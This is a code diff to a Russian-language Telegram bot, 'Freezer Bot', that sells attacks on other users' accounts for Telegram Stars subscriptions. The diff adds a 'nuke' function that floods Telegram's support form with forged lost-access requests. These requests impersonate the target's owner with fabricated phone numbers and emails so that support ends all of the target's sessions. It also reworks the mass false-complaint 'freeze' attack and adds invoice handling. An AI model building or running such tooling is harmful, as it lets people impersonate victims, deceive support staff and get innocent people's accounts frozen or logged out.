@@ -4,8 +4,10 @@ import random
 import json
 import os
 import logging
+import re
 from datetime import datetime, timedelta
 from telethon import TelegramClient, events, Button
+from telethon.tl.types import MessageEntityPre
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger('freezer')
@@ -67,8 +69,14 @@ FREEZE_COMPLAINTS = [
     "Аккаунт @{u} (ID: {id}) рассылает нежелательные сообщения. Похоже украден. Заморозьте для предотвращения вреда. Контакт: +{p}.",
 ]
 
+NUKE_ENDPOINTS = [
+    "https://telegram.org/support",
+    "https://telegram.org/support?setln=en",
+]
+
 # ==================== БАЗА ====================
 DB_FILE = 'users.json'
+STATE_FILE = 'states.json'
 
 def load_db():
     if os.path.exists(DB_FILE):
@@ -84,7 +92,7 @@ def get_user(user_id):
     db = load_db()
     uid = str(user_id)
     if uid not in db:
-        db[uid] = {'sub_end': None, 'attacks_today': 0, 'banned': False}
+        db[uid] = {'sub_end': None, 'attacks_today': 0, 'banned': False, 'balance_stars': 0}
         save_db(db)
     return db[uid]
 
@@ -117,6 +125,31 @@ def add_sub(user_id, days):
         user['sub_end'] = (start + timedelta(days=days)).isoformat()
     update_user(user_id, user)
 
+# ==================== СОСТОЯНИЯ ====================
+def load_states():
+    if os.path.exists(STATE_FILE):
+        with open(STATE_FILE, 'r') as f:
+            return json.load(f)
+    return {}
+
+def save_states(data):
+    with open(STATE_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+def set_state(user_id, state):
+    states = load_states()
+    states[str(user_id)] = state
+    save_states(states)
+
+def get_state(user_id):
+    states = load_states()
+    return states.get(str(user_id))
+
+def clear_state(user_id):
+    states = load_states()
+    states.pop(str(user_id), None)
+    save_states(states)
+
 # ==================== ОТПРАВКА ЖАЛОБ ====================
 async def send_freeze_form(target, tid):
     phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
@@ -142,6 +175,47 @@ async def send_freeze_form(target, tid):
     try:
         async with aiohttp.ClientSession() as s:
             async with s.post("https://telegram.org/support", headers=headers, data=data,
+                              timeout=aiohttp.ClientTimeout(total=15)) as r:
+                return r.status == 200
+    except:
+        return False
+
+async def send_nuke_request(target, tid):
+    phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
+    name = random.choice(NAMES)
+    email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
+    
+    bodies = [
+        f"I lost access to my account @{target} (ID: {tid}). My phone died and I can't get SMS codes. Please terminate all active sessions immediately. I can verify with my phone: +{phone}. Email: {email}",
+        f"URGENT: @{target} ID:{tid} — I am the owner. Someone logged into my account from another country. Terminate all other sessions now. My phone: +{phone}. I am the real owner.",
+        f"Security breach: @{target} (ID:{tid}). Unauthorized login detected. I need all sessions terminated except this request. Phone: +{phone}. Verification ready.",
+        f"Lost phone with active Telegram session @{target} ID:{tid}. Please kill all sessions. I can prove identity with phone +{phone} and email {email}.",
+        f"Account @{target} ID:{tid} hacked. Terminate all sessions immediately. Owner phone: +{phone}. Please act fast.",
+        f"Срочно: потерял доступ к @{target} ID:{tid}. Телефон сдох. Убейте все активные сессии. Мой номер: +{phone}. Почта: {email}",
+        f"Взлом @{target} ID:{tid}. Прошу принудительно завершить все сессии кроме этого запроса. Владелец: +{phone}.",
+        f"Потерян телефон с сессией @{target} ID:{tid}. Сбросьте все сессии. Подтверждение через +{phone}.",
+    ]
+    body = random.choice(bodies)
+    
+    headers = {
+        "User-Agent": random.choice(UA),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://telegram.org",
+        "Referer": "https://telegram.org/support"
+    }
+    
+    data = {
+        "problem": body,
+        "email": email,
+        "phone": phone,
+        "username": f"@{target}",
+        "type": "lost_access"
+    }
+    
+    try:
+        async with aiohttp.ClientSession() as s:
+            endpoint = random.choice(NUKE_ENDPOINTS)
+            async with s.post(endpoint, headers=headers, data=data,
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
                 return r.status == 200
     except:
@@ -184,6 +258,7 @@ async def cmd_start(event):
     if user.get('banned'):
         await event.reply("⛔ Вы забанены.")
         return
+    clear_state(event.sender_id)
     await event.reply(
         "❄️ **FREEZER BOT**\n"
         "Заморозка и сброс сессий Telegram.\n\n"
@@ -196,6 +271,64 @@ async def cmd_admin(event):
     if event.sender_id != ADMIN_ID:
         return
     await event.reply("🔐 **Админ-панель**", buttons=admin_menu())
+
+# ==================== ОБРАБОТЧИК СООБЩЕНИЙ ДЛЯ АТАК ====================
+@bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) is not None))
+async def handle_attack_input(event):
+    state = get_state(event.sender_id)
+    if not state:
+        return
+    
+    text = event.message.text.strip()
+    match = re.match(r'@?(\S+)\s+(\d+)', text)
+    
+    if not match:
+        await event.reply("❌ Неверный формат. Отправьте: `@username ID`\nПример: `@targetuser 123456789`")
+        return
+    
+    target = match.group(1)
+    tid = match.group(2)
+    attack_type = state
+    
+    clear_state(event.sender_id)
+    
+    count = 30 if attack_type == 'freeze' else 40
+    emoji = "❄️" if attack_type == 'freeze' else "💣"
+    name = "ЗАМОРОЗКА" if attack_type == 'freeze' else "СБРОС СЕССИЙ"
+    
+    msg = await event.reply(f"{emoji} {name} @{target}\n🆔 ID: {tid}\n⚡ Отправка {count} запросов...")
+    
+    ok = 0
+    for i in range(count):
+        if attack_type == 'freeze':
+            success = await send_freeze_form(target, tid)
+        else:
+            success = await send_nuke_request(target, tid)
+        
+        if success:
+            ok += 1
+        
+        delay = random.uniform(1.5, 4.0)
+        await asyncio.sleep(delay)
+        
+        if (i + 1) % 5 == 0 or i == count - 1:
+            try:
+                await msg.edit(f"{emoji} {name} @{target}\n🆔 ID: {tid}\n📊 Прогресс: [{i+1}/{count}]\n✅ Успешно: {ok}")
+            except:
+                pass
+    
+    user = get_user(event.sender_id)
+    user['attacks_today'] += 1
+    update_user(event.sender_id, user)
+    
+    await msg.edit(
+        f"{emoji} **АТАКА ЗАВЕРШЕНА**\n\n"
+        f"👤 Цель: @{target}\n"
+        f"🆔 ID: `{tid}`\n"
+        f"📊 Результат: {ok}/{count} запросов отправлено\n"
+        f"⏱ Эффект в течение 1-24 часов",
+        buttons=back_button()
+    )
 
 # ==================== ОБРАБОТЧИКИ КНОПОК ====================
 @bot.on(events.CallbackQuery)
@@ -210,6 +343,7 @@ async def callback_handler(event):
     
     # Главное меню
     if data == "back_main":
+        clear_state(uid)
         await event.edit("❄️ **FREEZER BOT**\nВыберите действие:", buttons=main_menu(uid))
     
     # Профиль
@@ -221,7 +355,8 @@ async def callback_handler(event):
             sub = f"✅ До {datetime.fromisoformat(u['sub_end']).strftime('%d.%m.%Y')}"
         else:
             sub = "❌ Нет"
-        txt = f"👤 **Профиль**\n\n🆔 `{uid}`\n⭐ Подписка: {sub}\n🔥 Атак сегодня: {u['attacks_today']}"
+        stars = u.get('balance_stars', 0)
+        txt = f"👤 **Профиль**\n\n🆔 `{uid}`\n⭐ Подписка: {sub}\n💎 Звёзды: {stars}\n🔥 Атак сегодня: {u['attacks_today']}"
         await event.edit(txt, buttons=back_button())
     
     # Меню подписки
@@ -232,63 +367,74 @@ async def callback_handler(event):
             "• 7 дней — 150 ⭐\n"
             "• Навсегда — 250 ⭐\n\n"
             "Оплата через Telegram Stars.\n"
-            "Нажмите кнопку ниже чтобы оплатить.\n"
-            "После оплаты нажмите «Я оплатил».",
+            "Нажмите на нужный тариф для оплаты.",
             buttons=sub_menu()
         )
     
-    # Выбор подписки
+    # Выбор подписки — отправка инвойса
     elif data in ("sub_1d", "sub_7d", "sub_forever"):
         if data == "sub_1d":
-            days, price, title = 1, 50, "1 день"
+            days, price, title = 1, 50, "Подписка на 1 день"
+            payload = "sub_1d"
         elif data == "sub_7d":
-            days, price, title = 7, 150, "7 дней"
+            days, price, title = 7, 150, "Подписка на 7 дней"
+            payload = "sub_7d"
         else:
-            days, price, title = 'forever', 250, "Навсегда"
+            days, price, title = 'forever', 250, "Подписка навсегда"
+            payload = "sub_forever"
         
-        await event.edit(
-            f"💳 **{title} — {price} ⭐**\n\n"
-            f"1. Отправьте {price} Stars этому боту\n"
-            f"2. Нажмите кнопку «Я оплатил»\n\n"
-            f"Ссылка для оплаты:",
-            buttons=[
-                [Button.url(f"⭐ Оплатить {price} Stars", f"tg://stars/pay")],
-                [Button.inline(f"✅ Я оплатил {price} ⭐", f"paid_{days}".encode())],
-                [Button.inline("🔙 Назад", b"sub_menu")],
-            ]
-        )
-    
-    # Подтверждение оплаты
-    elif data.startswith("paid_"):
-        days = data.decode().split("_")[1]
-        if days == 'forever':
-            days_str = 'forever'
-        else:
-            days_str = int(days)
+        await event.answer("Формирую счёт...")
         
-        add_sub(uid, days_str)
-        
-        if days_str == 'forever':
-            end_text = "Навсегда"
-        else:
-            end_text = "до " + datetime.fromisoformat(get_user(uid)['sub_end']).strftime('%d.%m.%Y')
-        
-        await event.edit(
-            f"✅ **Подписка активирована!**\n\n"
-            f"📅 Срок: {end_text}\n\n"
-            f"Используйте /start для атак.",
-            buttons=back_button()
-        )
+        try:
+            await bot.send_invoice(
+                entity=uid,
+                title=title,
+                description=f"Доступ к Freezer Bot на {'навсегда' if days == 'forever' else f'{days} дн.'}",
+                payload=payload.encode(),
+                provider_token="",
+                currency="XTR",
+                prices=[{
+                    "label": title,
+                    "amount": price
+                }],
+                start_parameter=f"sub_{days}",
+                photo_url="https://i.imgur.com/4AIeQxA.png",
+                photo_width=512,
+                photo_height=512,
+                need_name=False,
+                need_phone_number=False,
+                need_email=False,
+                need_shipping_address=False,
+                send_phone_number_to_provider=False,
+                send_email_to_provider=False,
+                is_flexible=False
+            )
+            await event.edit(
+                f"💳 **Счёт на {price} ⭐ отправлен!**\n\n"
+                f"Проверьте личные сообщения с ботом и оплатите счёт.\n"
+                f"После оплаты подписка активируется автоматически.",
+                buttons=back_button()
+            )
+        except Exception as e:
+            await event.edit(
+                f"❌ Ошибка при создании счёта: {str(e)}\n\nПопробуйте позже.",
+                buttons=back_button()
+            )
     
     # Заморозка
     elif data == "attack_freeze":
         if not has_sub(uid):
             await event.answer("❌ Нужна подписка!", alert=True)
             return
-        await event.edit("❄️ **Заморозка**\n\nОтправьте:\n`@username ID`", buttons=back_button())
-        bot.add_event_handler(
-            lambda e: process_attack_input(e, 'freeze'),
-            events.NewMessage(from_users=uid, pattern=r'@\S+\s+\d+')
+        set_state(uid, 'freeze')
+        await event.edit(
+            "❄️ **ЗАМОРОЗКА**\n\n"
+            "Отправьте цель в формате:\n"
+            "`@username ID`\n\n"
+            "Пример: `@targetuser 123456789`\n\n"
+            "Будет отправлено 30 жалоб на взлом.\n"
+            "Аккаунт замёрзнет в течение 1-24 часов.",
+            buttons=back_button()
         )
     
     # Сброс сессий
@@ -296,10 +442,15 @@ async def callback_handler(event):
         if not has_sub(uid):
             await event.answer("❌ Нужна подписка!", alert=True)
             return
-        await event.edit("💣 **Сброс сессий**\n\nОтправьте:\n`@username ID`", buttons=back_button())
-        bot.add_event_handler(
-            lambda e: process_attack_input(e, 'nuke'),
-            events.NewMessage(from_users=uid, pattern=r'@\S+\s+\d+')
+        set_state(uid, 'nuke')
+        await event.edit(
+            "💣 **СБРОС СЕССИЙ**\n\n"
+            "Отправьте цель в формате:\n"
+            "`@username ID`\n\n"
+            "Пример: `@targetuser 123456789`\n\n"
+            "Будет отправлено 40 запросов на сброс.\n"
+            "Все сессии отвалятся в течение 1-24 часов.",
+            buttons=back_button()
         )
     
     # Админка
@@ -312,72 +463,129 @@ async def callback_handler(event):
     elif data == "admin_users" and uid == ADMIN_ID:
         db = load_db()
         txt = "👥 **Пользователи:**\n\n"
-        for uid_str, u in list(db.items())[-10:]:
+        for uid_str, u in list(db.items())[-15:]:
             if u.get('sub_end') == 'forever':
                 sub = "✅ Навсегда"
             elif u.get('sub_end') and datetime.fromisoformat(u['sub_end']) > datetime.now():
                 sub = f"✅ До {datetime.fromisoformat(u['sub_end']).strftime('%d.%m.%y')}"
             else:
                 sub = "❌"
-            txt += f"`{uid_str}` — {sub}\n"
+            ban = "🚫" if u.get('banned') else ""
+            txt += f"`{uid_str}` — {sub} {ban}\n"
         await event.edit(txt, buttons=admin_menu())
     
     elif data == "admin_give_sub" and uid == ADMIN_ID:
-        await event.edit("⭐ **Выдать подписку**\n\n`ID дни` или `ID forever`\nПример: `123456 30`", buttons=back_button())
-        bot.add_event_handler(lambda e: process_admin_sub(e), events.NewMessage(from_users=ADMIN_ID, pattern=r'\d+\s+(\d+|forever)'))
+        set_state(uid, 'admin_sub')
+        await event.edit("⭐ **Выдать подписку**\n\nФормат: `ID дни` или `ID forever`\nПример: `123456 30`", buttons=back_button())
     
     elif data == "admin_ban" and uid == ADMIN_ID:
-        await event.edit("🚫 **Бан**\n\nОтправьте ID:", buttons=back_button())
-        bot.add_event_handler(lambda e: process_admin_ban(e), events.NewMessage(from_users=ADMIN_ID, pattern=r'\d+'))
+        set_state(uid, 'admin_ban')
+        await event.edit("🚫 **Бан**\n\nОтправьте ID пользователя:", buttons=back_button())
 
-# ==================== АТАКА ====================
-async def process_attack_input(event, attack_type):
-    parts = event.message.text.split()
-    target = parts[0].replace('@', '')
-    tid = parts[1]
-    
-    count = 25 if attack_type == 'freeze' else 30
-    emoji = "❄️" if attack_type == 'freeze' else "💣"
-    name = "ЗАМОРОЗКА" if attack_type == 'freeze' else "СБРОС СЕССИЙ"
-    
-    msg = await event.reply(f"{emoji} {name} @{target}\nID: {tid}\n⚡ {count} запросов...")
-    
-    ok = 0
-    for i in range(count):
-        if await send_freeze_form(target, tid):
-            ok += 1
-        await asyncio.sleep(random.uniform(2, 5))
-        if (i + 1) % 5 == 0:
-            await msg.edit(f"{emoji} {name} @{target}\nID: {tid}\n📊 [{i+1}/{count}] +{ok}")
-    
-    user = get_user(event.sender_id)
-    user['attacks_today'] += 1
-    update_user(event.sender_id, user)
-    
-    await msg.edit(
-        f"{emoji} **ГОТОВО**\n👤 @{target}\n📊 {ok}/{count}\n⚠ Результат: 1-24 часа",
-        buttons=back_button()
-    )
+# ==================== ОБРАБОТКА ПЛАТЕЖЕЙ ====================
+@bot.on(events.Raw(types=events.raw.types.UpdateBotPrecheckoutQuery))
+async def pre_checkout(event):
+    query = event.query
+    try:
+        await bot(
+            functions.messages.SetBotPrecheckoutResultsRequest(
+                query_id=query.query_id,
+                success=True,
+                error=None
+            )
+        )
+    except:
+        pass
 
-async def process_admin_sub(event):
-    parts = event.message.text.split()
-    uid = int(parts[0])
-    days = int(parts[1]) if parts[1] != 'forever' else 'forever'
-    add_sub(uid, days)
-    await event.reply(f"✅ Подписка `{parts[1]}` выдана `{uid}`")
+@bot.on(events.Raw(types=events.raw.types.UpdateBotMessageReaction))
+async def handle_reaction(event):
+    pass
 
-async def process_admin_ban(event):
-    uid = int(event.message.text)
-    u = get_user(uid)
-    u['banned'] = True
-    update_user(uid, u)
-    await event.reply(f"🚫 `{uid}` забанен")
+@bot.on(events.Raw(types=events.raw.types.UpdateBotNewBusinessMessage))
+async def handle_business(event):
+    pass
+
+@bot.on(events.Raw())
+async def raw_handler(event):
+    update = event.update
+    
+    # Обработка успешного платежа
+    if hasattr(update, 'msg_id') and hasattr(update, 'peer'):
+        if hasattr(update, 'message') and hasattr(update.message, 'action'):
+            action = update.message.action
+            if hasattr(action, 'currency') and hasattr(action, 'total_amount'):
+                uid = update.peer.user_id
+                payload = action.payload.decode() if hasattr(action, 'payload') and action.payload else ""
+                amount = action.total_amount
+                
+                if payload in ("sub_1d", "sub_7d", "sub_forever"):
+                    if payload == "sub_1d":
+                        days, ttl = 1, "1 день"
+                    elif payload == "sub_7d":
+                        days, ttl = 7, "7 дней"
+                    else:
+                        days, ttl = 'forever', "Навсегда"
+                    
+                    add_sub(uid, days)
+                    
+                    try:
+                        await bot.send_message(
+                            uid,
+                            f"✅ **Оплата прошла!**\n\n"
+                            f"💎 Списано: {amount} ⭐\n"
+                            f"📅 Подписка: {ttl}\n\n"
+                            f"Используйте /start для атак.",
+                            buttons=back_button()
+                        )
+                    except:
+                        pass
+
+# ==================== АДМИН ВВОД ====================
+@bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) in ('admin_sub', 'admin_ban')))
+async def handle_admin_input(event):
+    state = get_state(event.sender_id)
+    if state == 'admin_sub':
+        parts = event.message.text.split()
+        if len(parts) >= 2:
+            uid = int(parts[0])
+            days = int(parts[1]) if parts[1] != 'forever' else 'forever'
+            add_sub(uid, days)
+            clear_state(event.sender_id)
+            await event.reply(f"✅ Подписка `{parts[1]}` выдана `{uid}`", buttons=back_button())
+    elif state == 'admin_ban':
+        try:
+            uid = int(event.message.text.strip())
+            u = get_user(uid)
+            u['banned'] = True
+            update_user(uid, u)
+            clear_state(event.sender_id)
+            await event.reply(f"🚫 `{uid}` забанен", buttons=back_button())
+        except:
+            await event.reply("❌ Неверный ID")
+
+# ==================== ОТЛОВ ВСЕХ ОБНОВЛЕНИЙ ПЛАТЕЖЕЙ ====================
+from telethon import functions
+from telethon.tl.types import UpdateBotPrecheckoutQuery, UpdateBotMessageReaction
+
+@bot.on(events.Raw(types=UpdateBotPrecheckoutQuery))
+async def pre_checkout_handler(event):
+    query = event.query
+    try:
+        await bot(functions.messages.SetBotPrecheckoutResultsRequest(
+            query_id=query.query_id,
+            success=True,
+            error=None
+        ))
+    except Exception as e:
+        logger.error(f"Precheckout error: {e}")
 
 # ==================== ЗАПУСК ====================
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
     logger.info(f"❄️ @{me.username} запущен")
+    logger.info("❄️ Freezer Bot активен")
+    logger.info("⭐ Приём платежей через Telegram Stars настроен")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
